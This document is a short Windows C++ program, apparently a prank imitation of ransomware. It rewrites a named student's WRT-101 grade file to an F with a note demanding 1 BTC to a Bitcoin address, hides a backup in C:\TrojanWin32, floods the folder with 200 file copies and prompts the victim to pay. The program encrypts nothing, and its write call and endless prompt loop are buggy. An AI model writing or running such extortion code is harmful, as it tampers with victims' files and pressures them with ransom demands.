#include <fstream>
#include <direct.h>
#include <Windows.h>
#include <iostream>
#include <sstream>
#include <string>
using namespace std;
 
int main () {
	ofstream file;
	file.open ("Korvin_Steven_WRT-101_Grade.txt");
	file << "Name: Steven Korvin\nCourse: WRT-101\nGrade: A\n";
	file.close();

  	CopyFile("Korvin_Steven_WRT-101_Grade.txt", "Korvin_Steven_WRT-101_Grade_2.txt", FALSE);			
  
  	file.open ("Korvin_Steven_WRT-101_Grade.txt");
  	file << "Name: Steven Korvin\nCourse: WRT-101\nGrade: F\nI've changed your grade to an F. Send 1 BTC to 1LkSVLdURVp49ToKJQpzuAKyHDo3qtANYm if you want your grade changed back.\n";
  	file.close();  
  
  	_mkdir("C:\\TrojanWin32");  
  
  	CopyFile("Korvin_Steven_WRT-101_Grade_2.txt", "C:\\TrojanWin32\\Korvin_Steven_WRT-101_Grade_2.txt", FALSE);
  
  	remove("Korvin_Steven_WRT-101_Grade_2.txt");
  	
	std::string fileText = "Name: Steven Korvin\nCourse: WRT-101\nGrade: A\n";
    int i = 1;
    while(i < 201)
    {
        std::ostringstream fn;
        fn << "Korvin_Steven_WRT-101_Grade_2_" << i << ".txt";

		std::ofstream out(fn.str().c_str(),std::ios_base::binary);
        out.write(&fileText[1],fileText.size());

        cout  << "I have dumped file " << i++ << ".\n";
    }

		cout << "Pay up and I remove the files...or don't and the files stay. Will you pay up?\n[Yes/No:]";
		
		while (true)
	{
		int Yes;
		int No;
		string choice;
		cin >> choice;
	
		if (choice == "Yes")
		{
    		cout << "I'm glad we're playing it my way. A deal's a deal.";
    		system("del Korvin_Steven_WRT-101_Grade_2_*.txt");
		}
		
    	else if (choice == "No")
		{
		
    		cout << "The files stay.";
    		ShellExecute(0, 0, "https://www.cryptoprank.com/#/crypto", 0, 0 , SW_SHOW );
    		ShellExecute(0, 0, "YouGotHacked.mp4", 0, 0 , SW_SHOW );

		}
		
    	else 
		{	
			(cout << "Enter Yes or No\n[Yes/No:]");
		}
	}
}
